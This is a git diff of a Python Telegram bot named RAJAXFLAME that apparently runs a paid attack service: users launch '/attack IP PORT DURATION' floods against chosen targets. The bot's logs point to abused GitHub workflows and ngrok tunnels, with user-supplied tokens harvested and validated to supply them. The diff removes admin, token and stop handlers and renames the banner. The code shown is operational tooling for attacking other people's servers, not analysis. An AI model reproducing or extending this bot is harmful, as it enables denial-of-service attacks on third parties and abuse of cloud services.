-💡 Your tunnels will appear here when you start attacks with /attack or /run command
+💡 Your tunnels will appear here when you start attacks with /attack command
 """)
         return
     
     tunnels_text = f"""
-📊 **Total Active:** {len(active_tunnels)}
+📊 **Total Active Tunnels:** {len(active_tunnels)}
 """
     
     for i, tunnel_key in enumerate(active_tunnels, 1):
@@ -1075,411 +1054,45 @@ async def cmd_my_tunnels(update: Update, context: ContextTypes.DEFAULT_TYPE):
         tunnels_text += f"""
 🔗 **Tunnel {i}:**
 🌐 URL: `{tunnel_url}`
-💬 Chat: {chat_id}
 ⏰ Status: ✅ ACTIVE
 🔑 Token: `{tunnel_info['token'][:12]}...`
 """
     
     await send_rajaxflame_message(context, chat_id, tunnels_text, "tunnel")
 
-async def cmd_tunnel_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test ngrok tunnel functionality"""
-    user_id = update.effective_user.id
-    ngrok_tokens = get_user_ngrok_tokens(user_id)
-    
-    if not ngrok_tokens:
-        await update.message.reply_text("❌ **No ngrok tokens found**")
-        return
-    
-    msg = await update.message.reply_text("🔍 **Testing ngrok tokens...**")
-    
-    results = []
-    for i, token in enumerate(ngrok_tokens, 1):
-        await msg.edit_text(f"🔍 Testing token {i}/{len(ngrok_tokens)}...")
-        
-        # Validate token
-        is_valid = validate_ngrok_token(token)
-        status = "✅ Valid" if is_valid else "❌ Invalid"
-        
-        # Test tunnel creation
-        tunnel_data = None
-        if is_valid:
-            tunnel_data = create_ngrok_tunnel(token, 8080)
-            if tunnel_data:
-                tunnel_url = extract_tunnel_url(tunnel_data)
-                status += f" | ✅ Tunnel: {tunnel_url[:30]}..." if tunnel_url else " | ❌ Tunnel failed"
-            else:
-                status += " | ❌ Tunnel failed"
-        
-        results.append(f"Token {i}: {status}")
-        
-        # Cleanup
-        if tunnel_data and 'id' in tunnel_data:
-            delete_ngrok_tunnel(token, tunnel_data['id'])
-    
-    report = "🔧 **Ngrok Tunnel Test Results:**\n\n" + "\n".join(results)
-    await msg.edit_text(report)
+# ================ OTHER COMMAND HANDLERS ================
+async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    help_text = """
+🔥 **RAJAXFLAME v3.0 - COMMAND GUIDE**
 
-async def cmd_debug_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Debug token issues"""
-    user_id = update.effective_user.id
-    
-    # Check file existence
-    file_exists = os.path.exists(NGROK_TOKENS_FILE)
-    
-    # Check user tokens
-    user_tokens = get_user_ngrok_tokens(user_id)
-    
-    # Check file permissions
-    try:
-        with open(NGROK_TOKENS_FILE, "a", encoding="utf-8") as f:
-            f.write("# Test write\n")
-        writable = True
-    except:
-        writable = False
-    
-    debug_info = f"""
-🔧 **TOKEN DEBUG INFO**
+🔹 **User Commands**
+/start - Welcome message and bot info
+/help - Show this command guide
+/attack IP PORT DURATION - Launch tunnel attack
+/status - View attack and token status
+/tunnelstatus - Detailed tunnel status
+/mytunnels - Show your active tunnels
+/setngrok - Add Ngrok Auth Tokens
+/check - Validate Ngrok tokens
+/debug_tokens - Debug token issues
+/tunneltest - Test tunnel creation
 
-📁 File: {NGROK_TOKENS_FILE}
-📊 Exists: {file_exists}
-✍️ Writable: {writable}
-👤 Your Tokens: {len(user_tokens)}
+🔹 **Admin Commands**
+/control - Open admin control panel
+/logs - View recent attack logs
+/add USERID DAYS - Approve user
+/remove USERID - Remove user
+/threads NUMBER - Set default threads
+/file - Upload rajaxflame binary
+/stop - Stop ongoing attack
 
-🔑 Token List:
+🔹 **Owner Commands**
+/addadmin USERID - Add admin
+/removeadmin USERID - Remove admin
+
+👨‍💻 **Contact:** {DEVELOPER_TAG}
 """
-    
-    for i, token in enumerate(user_tokens, 1):
-        status = "✅ Valid" if validate_ngrok_token(token) else "❌ Invalid"
-        debug_info += f"{i}. `{token[:12]}...` - {status}\n"
-    
-    await update.message.reply_text(debug_info)
-
-async def cmd_addtoken(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Manual token addition"""
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-        
-    if len(context.args) < 2:
-        await update.message.reply_text("""
-💡 **Manual Token Add:**
-Usage: `/addtoken USER_ID NGROK_TOKEN`
-
-Example: `/addtoken 123456789 2ABC123...xyz`
-""")
-        return
-    
-    try:
-        target_user = int(context.args[0])
-        token = context.args[1]
-        
-        if validate_ngrok_token(token):
-            save_ngrok_token(target_user, token)
-            await update.message.reply_text(f"✅ Token added for user {target_user}")
-        else:
-            await update.message.reply_text("❌ Invalid token")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
-
-async def cmd_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("Stop Attack", callback_data="stop_attack")],
-        [InlineKeyboardButton("View Logs", callback_data="view_logs")],
-        [InlineKeyboardButton("Manage Users", callback_data="manage_users")],
-        [InlineKeyboardButton("Check Tokens", callback_data="check_tokens")]
-    ])
-    
-    control_text = """
-🎮 **CONTROL PANEL**
-
-🔹 Stop ongoing attacks
-🔹 View attack history
-🔹 Manage approved users
-🔹 Check token validity
-"""
-    await send_rajaxflame_message(context, update.effective_chat.id, control_text, "control", reply_markup=kb)
-
-async def cmd_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    
-    logs = load_json(ATTACK_LOGS_FILE, [])
-    if not logs:
-        await send_rajaxflame_message(context, update.effective_chat.id, "📜 **No Attack Logs Found**", "status")
-        return
-    
-    log_text = "📜 **ATTACK LOGS**\n\n"
-    for log in logs[-10:]:
-        log_text += f"""
-🕒 **Time**: {log['start_time'][11:19]} UTC
-👤 **User ID**: {log['user_id']}
-🎯 **Target**: {log['target']}
-⏱ **Duration**: {log['duration']}s
-⚡ **Workflows**: {log['workflows']}
-📁 **Repositories**: {log.get('repos', 0)}
-🌐 **Tunnels**: {len(log.get('tunnels', []))}
-{'-'*30}
-"""
-    await send_rajaxflame_message(context, update.effective_chat.id, log_text, "status")
-
-async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    
-    # Get the appropriate message object based on update type
-    if update.callback_query:
-        msg = await update.callback_query.message.reply_text("Checking tokens…")
-    else:
-        msg = await update.message.reply_text("Checking tokens…")
-    
-    await asyncio.sleep(0.4)
-    try:
-        await msg.edit_text("Checking tokens ▰▱▱")
-    except Exception:
-        pass
-    
-    github_lines = load_github_tokens()
-    ngrok_lines = load_ngrok_tokens()
-    
-    if is_admin(user_id):
-        results = {"github": {}, "ngrok": {}}
-        for i, line in enumerate(github_lines, 1):
-            u, tok = line.split(":", 1)
-            alive = validate_github_token(tok)
-            results["github"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
-            if i % 5 == 0:
-                try:
-                    await msg.edit_text(f"Progress {i}/{len(github_lines)}")
-                except Exception:
-                    pass
-        for i, line in enumerate(ngrok_lines, 1):
-            u, tok = line.split(":", 1)
-            alive = validate_ngrok_token(tok)
-            results["ngrok"].setdefault(u, {})[tok[:10] + "…"] = "live" if alive else "dead"
-        save_json(TOKENS_STATUS_FILE, results)
-        
-        # Send document based on update type
-        if update.callback_query:
-            await update.callback_query.message.reply_document(InputFile(TOKENS_STATUS_FILE))
-        else:
-            await update.message.reply_document(InputFile(TOKENS_STATUS_FILE))
-            
-        try:
-            await msg.edit_text("Done.")
-        except Exception:
-            pass
-    else:
-        github_own = [ln for ln in github_lines if ln.startswith(f"{user_id}:")]
-        ngrok_own = [ln for ln in ngrok_lines if ln.startswith(f"{user_id}:")]
-        github_live = github_dead = ngrok_live = ngrok_dead = 0
-        rows = []
-        for i, line in enumerate(github_own, 1):
-            _, tok = line.split(":", 1)
-            ok = validate_github_token(tok)
-            if ok:
-                github_live += 1
-                rows.append(f"GitHub {tok[:12]}…: ✅ live")
-            else:
-                github_dead += 1
-                rows.append(f"GitHub {tok[:12]}…: ❌ dead")
-        for i, line in enumerate(ngrok_own, 1):
-            _, tok = line.split(":", 1)
-            ok = validate_ngrok_token(tok)
-            if ok:
-                ngrok_live += 1
-                rows.append(f"Ngrok {tok[:12]}…: ✅ live")
-            else:
-                ngrok_dead += 1
-                rows.append(f"Ngrok {tok[:12]}…: ❌ dead")
-        final_text = "Your tokens:\n" + "\n".join(rows) + f"\n\nGitHub: {github_live} live, {github_dead} dead\nNgrok: {ngrok_live} live, {ngrok_dead} dead"
-        try:
-            await msg.edit_text(final_text)
-        except Exception:
-            # Use appropriate message method based on update type
-            if update.callback_query:
-                await update.callback_query.message.reply_text(final_text)
-            else:
-                await update.message.reply_text(final_text)
-    
-    # Clean tokens after checking
-    clean_github_tokens()
-    clean_ngrok_tokens()
-
-async def cmd_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    if len(context.args) != 2:
-        await update.message.reply_text("💡 **Usage:** /add USERID DAYS")
-        return
-    try:
-        target_user = int(context.args[0])
-        days = int(context.args[1])
-        add_user(target_user, days)
-        await update.message.reply_text(f"✅ **USER {target_user} ADDED FOR {days} DAYS**")
-    except ValueError:
-        await update.message.reply_text("❌ **INVALID USERID OR DAYS**")
-
-async def cmd_remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    if len(context.args) != 1:
-        await update.message.reply_text("💡 **Usage:** /remove USERID")
-        return
-    try:
-        target_user = int(context.args[0])
-        remove_user(target_user)
-        await update.message.reply_text(f"✅ **USER {target_user} REMOVED**")
-    except ValueError:
-        await update.message.reply_text("❌ **INVALID USERID**")
-
-async def cmd_addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_owner(user_id):
-        await update.message.reply_text(f"❌ **OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    if len(context.args) != 1:
-        await update.message.reply_text("💡 **Usage:** /addadmin USERID")
-        return
-    try:
-        target_user = int(context.args[0])
-        add_admin(target_user)
-        await update.message.reply_text(f"✅ **ADMIN {target_user} ADDED**")
-    except ValueError:
-        await update.message.reply_text("❌ **INVALID USERID**")
-
-async def cmd_removeadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_owner(user_id):
-        await update.message.reply_text(f"❌ **OWNER ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    if len(context.args) != 1:
-        await update.message.reply_text("💡 **Usage:** /removeadmin USERID")
-        return
-    try:
-        target_user = int(context.args[0])
-        remove_admin(target_user)
-        await update.message.reply_text(f"✅ **ADMIN {target_user} REMOVED**")
-    except ValueError:
-        await update.message.reply_text("❌ **INVALID USERID**")
-
-async def cmd_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    if not context.args:
-        await update.message.reply_text("💡 **Usage:** /threads NUMBER")
-        return
-    try:
-        threads = int(context.args[0])
-        set_default_threads(threads)
-        await update.message.reply_text(f"✅ **Default threads set to {threads}**")
-    except ValueError:
-        await update.message.reply_text("❌ **Invalid number**")
-
-async def cmd_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    await update.message.reply_text(f"📤 **Upload binary named '{BINARY_NAME}' now**")
-
-async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    chat_id = update.effective_chat.id
-    if not is_admin(user_id):
-        await update.message.reply_text(f"❌ **ADMIN ACCESS REQUIRED**\n\nContact: {DEVELOPER_TAG}")
-        return
-    status = ATTACK_STATUS.get(chat_id, {})
-    if not status.get("running"):
-        await send_rajaxflame_message(context, chat_id, "💤 **No Active Attacks to Stop**", "control")
-        return
-    try:
-        for repo in status.get("repos", []):
-            for token in status.get("github_tokens", []):
-                gh_delete_repo(token.replace("...", ""), repo)
-        for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
-            ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
-            delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[tunnel_key]["data"]["id"])
-            del ACTIVE_TUNNELS[tunnel_key]
-        ATTACK_STATUS[chat_id]["running"] = False
-        await send_rajaxflame_message(context, chat_id, "🛑 **Attack Stopped Successfully**", "control")
-    except Exception as e:
-        await send_rajaxflame_message(context, chat_id, f"⚠️ **Failed to Stop Attack**: {str(e)}", "control")
-
-async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    doc = update.message.document
-    if not doc:
-        return
-    if doc.file_name == BINARY_NAME and is_admin(user_id):
-        if os.path.exists(BINARY_PATH):
-            os.remove(BINARY_PATH)
-        f = await doc.get_file()
-        await f.download_to_drive(custom_path=BINARY_PATH)
-        await update.message.reply_text(f"✅ **Binary '{BINARY_NAME}' saved**")
-
-async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    chat_id = update.effective_chat.id
-    
-    if query.data == "stop_attack":
-        status = ATTACK_STATUS.get(chat_id, {})
-        if not status.get("running"):
-            await query.edit_message_text("💤 **No Active Attacks to Stop**")
-            return
-        try:
-            for repo in status.get("repos", []):
-                for token in status.get("github_tokens", []):
-                    gh_delete_repo(token.replace("...", ""), repo)
-            for tunnel_key in [k for k in ACTIVE_TUNNELS if k.startswith(f"{chat_id}_")]:
-                ngrok_token = ACTIVE_TUNNELS[tunnel_key]["token"]
-                delete_ngrok_tunnel(ngrok_token, ACTIVE_TUNNELS[tunnel_key]["data"]["id"])
-                del ACTIVE_TUNNELS[tunnel_key]
-            ATTACK_STATUS[chat_id]["running"] = False
-            await query.edit_message_text("🛑 **Attack Stopped Successfully**")
-        except Exception as e:
-            await query.edit_message_text(f"⚠️ **Failed to Stop Attack**: {str(e)}")
-    
-    elif query.data == "view_logs":
-        logs = load_json(ATTACK_LOGS_FILE, [])
-        if not logs:
-            await query.edit_message_text("📜 **No Attack Logs Found**")
-            return
-        log_text = "📜 **ATTACK LOGS**\n\n"
-        for log in logs[-10:]:
-            log_text += f"""
-🕒 **Time**: {log['start_time'][11:19]} UTC
-👤 **User ID**: {log['user_id']}
-🎯 **Target**: {log['target']}
-⏱ **Duration**: {log['duration']}s
-⚡ **Workflows**: {log['workflows']}
-📁 **Repositories**: {log.get('repos', 0)}
-🌐 **Tunnels**: {len(log.get('tunnels', []))}
-{'-'*30}
-"""
-        await query.edit_message_text(log_text)
-    
-    elif query.data == "manage_users":
-        if not os.path.exists(USERS_FILE):
-            save_json(USERS_FILE, {})
-        await query.message.reply_document(InputFile(USERS_FILE))
-    
-    elif query.data == "check_tokens":
-        await cmd_check(update, context)
+    await send_rajaxflame_message(context, update.effective_chat.id, help_text, "welcome")
 
 # ================ 🏗️ APPLICATION BUILDER 🏗️ ================
 def build_rajaxflame_app():
@@ -1488,27 +1101,19 @@ def build_rajaxflame_app():
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("help", cmd_help))
     app.add_handler(CommandHandler("attack", cmd_attack))
-    app.add_handler(CommandHandler("run", cmd_run))
-    app.add_handler(CommandHandler("setgithub", cmd_setgithub))
     app.add_handler(CommandHandler("setngrok", cmd_setngrok))
     app.add_handler(CommandHandler("status", cmd_status))
     app.add_handler(CommandHandler("tunnelstatus", cmd_tunnel_status))
     app.add_handler(CommandHandler("mytunnels", cmd_my_tunnels))
     app.add_handler(CommandHandler("tunneltest", cmd_tunnel_test))
     app.add_handler(CommandHandler("debug_tokens", cmd_debug_tokens))
-    app.add_handler(CommandHandler("addtoken", cmd_addtoken))
-    app.add_handler(CommandHandler("control", cmd_control))
-    app.add_handler(CommandHandler("logs", cmd_logs))
-    app.add_handler(CommandHandler("add", cmd_add))
-    app.add_handler(CommandHandler("remove", cmd_remove))
-    app.add_handler(CommandHandler("addadmin", cmd_addadmin))
-    app.add_handler(CommandHandler("removeadmin", cmd_removeadmin))
-    app.add_handler(CommandHandler("threads", cmd_threads))
-    app.add_handler(CommandHandler("file", cmd_file))
-    app.add_handler(CommandHandler("stop", cmd_stop))
     app.add_handler(CommandHandler("check", cmd_check))
-    app.add_handler(CallbackQueryHandler(on_button))
-    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
+    
+    # Add other handlers as needed
+    # app.add_handler(CommandHandler("control", cmd_control))
+    # app.add_handler(CommandHandler("logs", cmd_logs))
+    # app.add_handler(CommandHandler("add", cmd_add))
+    # app.add_handler(CommandHandler("file", cmd_file))
     
     return app
 
@@ -1517,11 +1122,12 @@ if __name__ == "__main__":
         level=logging.INFO,
         format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
     )
+    
     print("""
 ╔══════════════════════════════╗
 ║    🔥 **RAJAXFLAME v3.0**    ║
-║    ⚡ **ULTRA INSTANT**      ║
-║    💥 **MULTI-TOKEN ATTACK** ║
+║    ⚡ **TUNNEL ATTACK**      ║
+║    💥 **NGROK INTEGRATION**  ║
 ╚══════════════════════════════╝
     """)
     
@@ -1530,11 +1136,6 @@ if __name__ == "__main__":
         with open(NGROK_TOKENS_FILE, "w", encoding="utf-8") as f:
             f.write("# Ngrok Tokens File\n")
         print("✅ Ngrok tokens file created")
-    
-    if not os.path.exists(GITHUB_TOKENS_FILE):
-        with open(GITHUB_TOKENS_FILE, "w", encoding="utf-8") as f:
-            f.write("# GitHub Tokens File\n")
-        print("✅ GitHub tokens file created")
     
     app = build_rajaxflame_app()
     app.run_polling()
